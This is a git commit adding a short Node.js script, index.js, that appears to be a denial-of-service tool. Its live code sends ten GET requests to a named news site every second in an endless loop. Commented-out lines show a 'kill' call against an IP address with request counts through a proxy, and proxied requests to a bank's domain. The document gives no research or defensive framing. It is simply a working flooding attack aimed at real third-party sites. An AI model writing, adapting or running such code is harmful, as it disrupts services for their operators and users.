8b8f4dc50bc82380d3817717a396cad70443e5b5
OLEGYERA <olegyera@gmail.com>
2022-03-03 13:23:55 +0200

    first commit

---
+++ index.js
@@ -0,0 +1,37 @@
+const GRequest = require('./lib/g-request');
+
+const Url = 'https://nsn.fm/';
+
+function Interact(){
+  const gateway_request = new GRequest();
+
+  for(var i=0; i<10; i++){
+    gateway_request.get(Url)
+  }
+}
+
+
+
+setInterval(Interact, 1000)
+
+
+
+//
+// var api = new Kira();
+//
+// api.kill('https://67.227.226.240 ', 200, 10000, "http://" + host + ":" + port);
+
+// var proxyUrl = "http://" + user + ":" + password + "@" + host + ":" + port;
+//
+// var proxiedRequest = request.defaults({'proxy': proxyUrl});
+//
+// proxiedRequest.get("https://fransabank.by/", function (e, r) {
+//   if(e){
+//     console.log('error')
+//   } else {
+//     console.log(resp?.statusCode)
+//   }
+//
+//
+//
+// })
